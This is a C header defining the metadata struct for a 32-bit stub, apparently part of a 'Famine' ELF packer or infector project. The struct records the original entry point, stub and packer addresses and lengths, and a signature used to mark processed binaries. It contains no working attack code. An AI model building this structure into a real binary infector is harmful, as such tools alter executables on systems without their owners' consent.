/**
 * @file stub_def.h
 * @brief 32-bit stub data structure definition.
 */

#ifndef STUB_32_STUB_DEF_H
#define STUB_32_STUB_DEF_H

// ---
// Includes
// ---

#include <stdint.h>
#include "famine.h"

// ---
// Typedefs
// ---

/**
 * @brief Stub metadata populated by the packer.
 *
 * This structure is embedded in the stub's .stub.data section and filled
 * at pack time with runtime decryption parameters.
 */
typedef struct __attribute__((packed)) {
	uint32_t	stub_virt_off;     /**< Stub's virtual address offset. */
	uint32_t	entry_point;       /**< Original program entry point. */
	int16_t		interp_idx;        /**< PHT index of the PT_INTERP, -1 if no interp */
	uint32_t	stub32_vaddr;      /**< Stub 32 vaddr */
	uint32_t	stub32_len;        /**< Stub 32 len */
	uint32_t	stub64_vaddr;      /**< Stub 64 vaddr */
	uint32_t	stub64_len;        /**< Stub 64 len */
	uint32_t	packer32_vaddr;    /**< Packer 32 vaddr */
	uint32_t	packer32_len;      /**< Packer 32 len */
	uint32_t	packer64_vaddr;    /**< Packer 64 vaddr */
	uint32_t	packer64_len;      /**< Packer 64 len */
	char		sign[FAMINE_SIGN_LEN];        /**< Famine signature */
}	t_stub_32_data;

#endif
